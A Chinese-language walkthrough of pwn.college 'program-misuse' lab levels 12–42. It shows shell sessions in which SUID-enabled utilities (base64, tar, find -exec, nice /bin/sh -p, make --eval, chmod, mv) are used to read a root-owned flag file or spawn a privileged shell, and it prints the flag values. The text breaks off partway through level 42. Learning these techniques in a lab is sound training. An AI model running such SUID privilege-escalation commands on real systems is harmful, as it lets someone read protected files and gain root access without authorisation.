<p>这里已经可以直接复制了，但是希望有更简便的形势，去看了文档，但是没太研究明白，瞎整了一个输出</p>
<pre><code>hacker@program-misuse-level-12:~$ hd -f /flag
hd: &quot;pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}&quot;: bad format
hacker@program-misuse-level-12:~$
</code></pre>
<h2 id="level13-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level13-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level13 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>Welcome to ./babysuid_level13!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/xxd.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/xxd!
</code></pre>
<p><code>xxd</code>，是个二进制的工具。这个我会</p>
<pre><code>hacker@program-misuse-level-13:~$ xxd /flag
00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59  pwn.college{MV-Y
00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a  n_4eGwlcoIT8JcWJ
00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32  i4wd-Si.0VN1EDL2
00000030: 516a 4d79 4d7a 577d 0a                   QjMyMzW}.
</code></pre>
<p>然后手动复制…</p>
<pre><code>pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW}
</code></pre>
<h2 id="level14-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level14-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level14 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>hacker@program-misuse-level-14:~$ sh file.sh
Welcome to ./babysuid_level14!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/base32.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/base32!
</code></pre>
<p><code>base32</code>都出来了,就一个参数 -d</p>
<pre><code>hacker@program-misuse-level-14:~$ base32 /flag
OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD
EULKJV4U26SXPUFA====
hacker@program-misuse-level-14:~$ base32 /flag | base32 -d
pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW}
hacker@program-misuse-level-14:~$
</code></pre>
<p>那我猜下一个是base64</p>
<h2 id="level15-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level15-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level15 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>hacker@program-misuse-level-15:~$ sh file.sh
Welcome to ./babysuid_level15!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/base64.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/base64!
hacker@program-misuse-level-15:~$
</code></pre>
<p>嘿嘿，果然</p>
<pre><code>hacker@program-misuse-level-15:~$ base64 /flag | base64 -d
pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW}
hacker@program-misuse-level-15:~$
</code></pre>
<h2 id="level16-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level16-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level16 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>hacker@program-misuse-level-16:~$ sh file.sh
Welcome to ./babysuid_level16!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/split.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/split!
</code></pre>
<p><code>split</code>是一个分块的工具，但是由于题中的flag很小，还达不到它默认的限度（默认参数需要看手册），因此在运行</p>
<pre><code>split /flag
</code></pre>
<p>之后，就会在文件夹之下有个输出文件。</p>
<pre><code>hacker@program-misuse-level-16:~$ cat xaa
pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW}
</code></pre>
<p><strong>小总结，除了最近基本的进制、ascii等，base32和base64最好可以了解一下这两种编码方式</strong></p>
<h2 id="level17-forces-you-to-understand-different-archive-formats"><a class="header" href="#level17-forces-you-to-understand-different-archive-formats">level17 Forces you to understand different archive formats!</a></h2>
<pre><code>hacker@program-misuse-level-17:~$ sh file.sh
Welcome to ./babysuid_level17!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/gzip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gzip!
</code></pre>
<p>牛马的<code>gzip</code>，压缩和解压缩，看来后几个都是这个意思</p>
<p>然后开始秒题</p>
<pre><code>hacker@program-misuse-level-17:~$ gzip -f /flag -t
hacker@program-misuse-level-17:~$ ls /
bin   challenge  etc      home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  dev        flag.gz  lib   lib64  media   opt  root  sbin  sys  usr
hacker@program-misuse-level-17:~$ gzip -cd /flag.gz
pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW}
hacker@program-misuse-level-17:~$
</code></pre>
<h2 id="level18-forces-you-to-understand-different-archive-formats"><a class="header" href="#level18-forces-you-to-understand-different-archive-formats">level18 Forces you to understand different archive formats!</a></h2>
<p>开始无聊起来了。。。</p>
<pre><code>hacker@program-misuse-level-18:~$ sh file.sh
Welcome to ./babysuid_level18!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/bzip2.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2!
</code></pre>
<p>然后和上面的命令完全一样，就是压缩的格式和算法不同了</p>
<pre><code>hacker@program-misuse-level-18:~$ bzip2 -f  /flag
hacker@program-misuse-level-18:~$ ls /
bin   challenge  etc       home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  dev        flag.bz2  lib   lib64  media   opt  root  sbin  sys  usr
hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2
pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW}
hacker@program-misuse-level-18:~$
</code></pre>
<h2 id="level19-forces-you-to-understand-different-archive-formats"><a class="header" href="#level19-forces-you-to-understand-different-archive-formats">level19 Forces you to understand different archive formats!</a></h2>
<pre><code>Welcome to ./babysuid_level19!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/zip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/zip!
</code></pre>
<p>这几个题可有点儿烦人了啊！</p>
<pre><code>hacker@program-misuse-level-19:~$ cat /flag.zip
PK
V3199flagUT	�dBdux
                      pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW}
PK
V3199flagUT�dux
               PKJwhacker@program-misuse-level-19:~$
</code></pre>
<p>正确的方式应该是先解压，但是貌似能直接看，我就没管</p>
<h2 id="level20-forces-you-to-understand-different-archive-formats"><a class="header" href="#level20-forces-you-to-understand-different-archive-formats">level20 Forces you to understand different archive formats!</a></h2>
<pre><code>hacker@program-misuse-level-20:~$ sh file.sh
Welcome to ./babysuid_level20!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/tar.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tar!
</code></pre>
<p><code>tar</code>比较常见。</p>
<pre><code>hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag
tar: Removing leading `/' from member names
hacker@program-misuse-level-20:~$ ls /
bin   challenge  etc   flag.tar  lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        flag  home      lib32  libx32  mnt    proc  run   srv   tmp  var
hacker@program-misuse-level-20:~$ cat /flag.tar
flag0000400000000000000000000000007114456374677010423 0ustar  rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW}
hacker@program-misuse-level-20:~$
</code></pre>
<p>好像都可以直接用cat看压缩包，那么就比较简单了</p>
<h2 id="level21-forces-you-to-understand-different-archive-formats"><a class="header" href="#level21-forces-you-to-understand-different-archive-formats">level21 Forces you to understand different archive formats!</a></h2>
<pre><code>hacker@program-misuse-level-21:~$ sh file.sh
Welcome to ./babysuid_level21!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/ar.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ar!
</code></pre>
<p><code>ar</code>工具，集合很多文档存成一个文档的工具</p>
<pre><code>hacker@program-misuse-level-21:~$ ar rs /flag.a /flag
ar: creating /flag.a
hacker@program-misuse-level-21:~$ cat /flag.a
!&lt;arch&gt;
flag/           0           0     0     644     57        `
pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW}

hacker@program-misuse-level-21:~$
</code></pre>
<h2 id="level22-forces-you-to-understand-different-archive-formats"><a class="header" href="#level22-forces-you-to-understand-different-archive-formats">level22 Forces you to understand different archive formats!</a></h2>
<pre><code>hacker@program-misuse-level-22:~$ sh file.sh
Welcome to ./babysuid_level22!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/cpio.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cpio!
</code></pre>
<p><code>cpio</code>工具，用于文件备份的</p>
<pre><code>hacker@program-misuse-level-22:~$  find /flag | cpio -ov &gt; archive.cpio
/flag
1 block
hacker@program-misuse-level-22:~$ ls /
bin   challenge  etc   home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  dev        flag  lib   lib64  media   opt  root  sbin  sys  usr
hacker@program-misuse-level-22:~$ ls
Desktop    Downloads  Pictures  Templates  archive.cpio  file.sh
Documents  Music      Public    Videos     core          test.py
hacker@program-misuse-level-22:~$ cat archive.cpio
�wd�9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW}
�
 TRAILER!!!hacker@program-misuse-level-22:~$
</code></pre>
<h2 id="level23-forces-you-to-understand-different-archive-formats"><a class="header" href="#level23-forces-you-to-understand-different-archive-formats">level23 Forces you to understand different archive formats!</a></h2>
<pre><code>hacker@program-misuse-level-23:~$ sh file.sh
Welcome to ./babysuid_level23!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/genisoimage.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage!
</code></pre>
<p><code>genisoimage</code>工具，能看出来作用是建立ISO 9660映像文件</p>
<pre><code>er@program-misuse-level-23:~$  genisoimage -sort /flag
genisoimage: Incorrect sort file format
        pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW}
hacker@program-misuse-level-23:~$
</code></pre>
<p><em>这块儿好像cat不太星了，输出会打乱shell</em></p>
<p><strong>小总结：倒是知道了很多以前不知道的工具。</strong></p>
<h2 id="level24-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level24-enables-you-to-read-flags-by-making-them-execute-other-commands">level24 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>sh hacker@program-misuse-level-24:~$ sh file.sh
Welcome to ./babysuid_level24!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/env.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/env!
</code></pre>
<p>开始有意思起来了。</p>
<pre><code>hacker@program-misuse-level-24:~$ env cat /flag
pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW}
hacker@program-misuse-level-24:~$
</code></pre>
<p>env可以给其他的程序赋权？感觉是这个意思，当然出题人想要的意思应该是需要先设一个shell，然后执行。</p>
<h2 id="level25-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level25-enables-you-to-read-flags-by-making-them-execute-other-commands">level25 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-25:~$ sh file.sh
Welcome to ./babysuid_level25!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/find.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/find!
</code></pre>
<p>使用find</p>
<pre><code>hacker@program-misuse-level-25:~$ find / -type f -name &quot;flag&quot; -exec cat {} \;
pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW}
hacker@program-misuse-level-25:~$
</code></pre>
<p>这里需要考虑的是find只是找到，如何读取？</p>
<ul>
<li>使用<code>-exec</code></li>
</ul>
<h2 id="level26-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level26-enables-you-to-read-flags-by-making-them-execute-other-commands">level26 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-26:~$ sh file.sh
Welcome to ./babysuid_level26!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/make.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/make!
</code></pre>
<p>有点儿意思啊，直接出现了GNU Make了</p>
<pre><code>hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\n\t-'&quot;$COMMAND&quot;
pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW}
hacker@program-misuse-level-26:~$
</code></pre>
<p>这个搜了一下，然后不光查到了正确答案还发现自己做错了，出题人想要的是 sh -p 这样提权</p>
<blockquote>
<p>这个命令的作用是启动一个新的shell进程，并将该进程的环境变量设置为当前shell进程的环境变量。
具体来说，这个命令包含以下部分：
env：这是一个用于执行命令时设置环境变量的工具。在这个命令中，它用于将当前shell进程的所有环境变量传递给新的shell进程。</p>
<p>sh：这是一个用于启动shell进程的命令。在这个命令中，它用于启动一个新的shell进程。</p>
<p>-p：这是一个选项，用于告诉新的shell进程将其环境变量设置为当前shell进程的环境变量。具体来说，它会将当前shell进程的环境变量从环境变量文件（如/etc/environment、/etc/profile、~/.bashrc等）中读取，并将其设置为新的shell进程的环境变量。</p>
<p>因此，这个命令的效果是启动一个新的shell进程，并将其环境变量设置为当前shell进程的环境变量。这可以用于测试shell脚本或命令对环境变量的影响，或者在两个不同的shell进程之间共享环境变量。</p>
</blockquote>
<p>看起来就是赋权，然后会拿到一个新的shell提示符</p>
<h2 id="level27-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level27-enables-you-to-read-flags-by-making-them-execute-other-commands">level27 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-27:~$ sh file.sh
Welcome to ./babysuid_level27!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/nice.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/nice!
</code></pre>
<p><code>nice</code>工具:用于以指定的进程调度优先级启动其他的程序。</p>
<pre><code>hacker@program-misuse-level-27:~$ nice /bin/sh -p
# cat /flag
pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW}
#
</code></pre>
<p>这样才是题目想要的，我傻了</p>
<h2 id="level28-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level28-enables-you-to-read-flags-by-making-them-execute-other-commands">level28 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-28:~$ sh file.sh
Welcome to ./babysuid_level28!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/timeout.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/timeout!
</code></pre>
<p><code>timeout</code>工具：用来指定时间后杀死进程的。</p>
<pre><code>hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p
# cat /flag
pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW}
#
</code></pre>
<p>这个需要注意指定一个时间</p>
<h2 id="level29-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level29-enables-you-to-read-flags-by-making-them-execute-other-commands">level29 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-29:~$ sh file.sh
Welcome to ./babysuid_level29!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/stdbuf.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf!
</code></pre>
<p><code>stdbuf</code>工具：修改标准流的缓冲模式和大小</p>
<pre><code>hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p
# cat /flag
pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW}
#
</code></pre>
<p>别用man，真的不好用</p>
<h2 id="level30-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level30-enables-you-to-read-flags-by-making-them-execute-other-commands">level30 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-30:~$ sh file.sh
Welcome to ./babysuid_level30!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/setarch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/setarch!
</code></pre>
<p><code>setarch</code>工具: 改变架构的工具</p>
<pre><code>hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p
# cat /flag
pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW}
#
</code></pre>
<p>它这个说默认是/bin/sh，可以切i386，在man里写着呢</p>
<h2 id="level31-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level31-enables-you-to-read-flags-by-making-them-execute-other-commands">level31 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-31:~$ sh file.sh
Welcome to ./babysuid_level31!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/watch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/watch!
</code></pre>
<p><code>watch</code>工具：执行命令然后全屏输出</p>
<pre><code>hacker@program-misuse-level-31:~$ watch -x cat /flag
### 使用后会输出到全屏
pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW}
</code></pre>
<p>很神奇的工具，然而发现tldr不怎么全，只有常见命令，到CTF的环境之中就不太适用了</p>
<h2 id="level32-enables-you-to-read-flags-by-making-them-execute-other-commands"><a class="header" href="#level32-enables-you-to-read-flags-by-making-them-execute-other-commands">level32 Enables you to read flags by making them execute other commands!</a></h2>
<pre><code>hacker@program-misuse-level-32:~$ sh file.sh
Welcome to ./babysuid_level32!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/socat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/socat!
</code></pre>
<p><code>socat</code>：是个和socket有关的工具。</p>
<pre><code>hacker@program-misuse-level-32:~$ socat -u &quot;file:/flag&quot; -
pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW}
hacker@program-misuse-level-32:~$
</code></pre>
<h2 id="level33-requires-some-light-programming-to-read-the-flag"><a class="header" href="#level33-requires-some-light-programming-to-read-the-flag">level33 Requires some light programming to read the flag.!</a></h2>
<pre><code>hacker@program-misuse-level-33:~$ sh file.sh
Welcome to ./babysuid_level33!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/whiptail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail!
</code></pre>
<p><code>whiptail</code>：展示shell的对话框的工具</p>
<pre><code>hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40
pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW}
</code></pre>
<p>是一个打开对话框的工具，因此思路就是直接展示出来就行了。</p>
<h2 id="level34-requires-some-light-programming-to-read-the-flag"><a class="header" href="#level34-requires-some-light-programming-to-read-the-flag">level34 Requires some light programming to read the flag.!</a></h2>
<pre><code>hacker@program-misuse-level-34:~$ sh file.sh
Welcome to ./babysuid_level34!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/awk.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/awk!
</code></pre>
<p>这次是一个我一直都不怎么会用的工具了。。。你妈的</p>
<pre><code>hacker@program-misuse-level-34:~$ awk '{print $1}' /flag
pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW}
hacker@program-misuse-level-34:~$
</code></pre>
<p><code>awk</code>是一个很有用的工具，有时间还是得学一学</p>
<h2 id="level35-requires-some-light-programming-to-read-the-flag"><a class="header" href="#level35-requires-some-light-programming-to-read-the-flag">level35 Requires some light programming to read the flag.!</a></h2>
<pre><code>hacker@program-misuse-level-35:~$ sh file.sh
Welcome to ./babysuid_level35!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/sed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/sed!
</code></pre>
<p>果然，在awk之后我就应该想到是sed</p>
<pre><code>hacker@program-misuse-level-35:~$ sed p /flag
pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
hacker@program-misuse-level-35:~$
</code></pre>
<p>也许我之前操作错了什么，这里不应该是两行flag吧？</p>
<h2 id="level36-requires-some-light-programming-to-read-the-flag"><a class="header" href="#level36-requires-some-light-programming-to-read-the-flag">level36 Requires some light programming to read the flag.!</a></h2>
<pre><code>hacker@program-misuse-level-36:~$ sh file.sh
Welcome to ./babysuid_level36!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/ed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ed!
</code></pre>
<p><code>ed</code>工具：是个编辑器，是交互式的</p>
<pre><code>hacker@program-misuse-level-36:~$ ed /flag
57
.p
pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW}
</code></pre>
<p>显示全文</p>
<h2 id="level37-lets-you-get-the-flag-by-doing-tricks-with-permissions"><a class="header" href="#level37-lets-you-get-the-flag-by-doing-tricks-with-permissions">level37 Lets you get the flag by doing tricks with permissions!</a></h2>
<pre><code>hacker@program-misuse-level-37:~$ sh file.sh
Welcome to ./babysuid_level37!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chown.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chown!
</code></pre>
<p><code>chown</code>工具：改变文件的所有者和组的</p>
<pre><code>hacker@program-misuse-level-37:~$ chown hacker /flag
hacker@program-misuse-level-37:~$ cat /flag
pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW}
hacker@program-misuse-level-37:~$
</code></pre>
<p>这就是简单的赋权了</p>
<h2 id="level38-lets-you-get-the-flag-by-doing-tricks-with-permissions"><a class="header" href="#level38-lets-you-get-the-flag-by-doing-tricks-with-permissions">level38 Lets you get the flag by doing tricks with permissions!</a></h2>
<pre><code>hacker@program-misuse-level-38:~$ sh file.sh
Welcome to ./babysuid_level38!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chmod.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chmod!
</code></pre>
<p>这个，没人不会吧</p>
<pre><code>hacker@program-misuse-level-38:~$ chmod 777 /flag
hacker@program-misuse-level-38:~$ cat /flag
pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW}
hacker@program-misuse-level-38:~$
</code></pre>
<h2 id="level39-lets-you-get-the-flag-by-doing-tricks-with-permissions"><a class="header" href="#level39-lets-you-get-the-flag-by-doing-tricks-with-permissions">level39 Lets you get the flag by doing tricks with permissions!</a></h2>
<pre><code>hacker@program-misuse-level-39:~$ sh file.sh
Welcome to ./babysuid_level39!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/cp.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cp!
</code></pre>
<p>一开始想搞个硬链接，然后发现不行，然后输出到<a href="https://blog.csdn.net/Dontla/article/details/121200247">标准输出流</a>就行了</p>
<pre><code>hacker@program-misuse-level-39:~$ cp /flag /dev/stdout
pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW}
hacker@program-misuse-level-39:~$
</code></pre>
<h2 id="level40-lets-you-get-the-flag-by-doing-tricks-with-permissions"><a class="header" href="#level40-lets-you-get-the-flag-by-doing-tricks-with-permissions">level40 Lets you get the flag by doing tricks with permissions!</a></h2>
<pre><code>hacker@program-misuse-level-40:~$ sh file.sh
Welcome to ./babysuid_level40!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/mv.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
</code></pre>
<p>这题，十分的离谱啊，完全不会做，看的答案，实在是太骚气了，使用mv把cat覆盖mv</p>
<pre><code>hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv
hacker@program-misuse-level-40:~$ sh file.sh
Welcome to ./babysuid_level40!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/mv.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
hacker@program-misuse-level-40:~$ mv /flag
pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW}
hacker@program-misuse-level-40:~$
</code></pre>
<p>///@TODO:这个值得记录一下！</p>
<p>这个题让我想起了一个看到的内容：</p>
<blockquote>
<p>如果我们在命令之中不使用管道而使用重定向（这是新手可能会犯的错误）那么前一个输出会重写到后面的命令之中造成混乱，比如 cat /flag &gt; more</p>
</blockquote>
<h2 id="level41-lets-you-read-the-flag-because-they-let-you-program-anything"><a class="header" href="#level41-lets-you-read-the-flag-because-they-let-you-program-anything">level41 Lets you read the flag because they let you program anything!</a></h2>
<pre><code>hacker@program-misuse-level-41:~$ sh file.sh
Welcome to ./babysuid_level41!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/perl.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/perl!
</code></pre>
<p><code>perl</code>是个脚本解释器，</p>
<pre><code>hacker@program-misuse-level-41:~$ perl -ne &quot;print if pwn.college&quot; /flag
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LC_CTYPE = &quot;C.UTF-8&quot;,
        LANG = &quot;en_US.UTF-8&quot;
    are supported and installed on your system.
perl: warning: Falling back to the standard locale (&quot;C&quot;).
pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW}
hacker@program-misuse-level-41:~$
</code></pre>
<p>打印有pen.college的行</p>
<h2 id="level42-lets-you-read-the-flag-because-they-let-you-program-anything"><a class="header" href="#level42-lets-you-read-the-flag-because-they-let-you-program-anything">level42 Lets you read the flag because they let you program anything!</a></h2>
<pre><code>hacker@program-misuse-level-42:~$ sh file.sh
Welcome to ./babysuid_level42!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

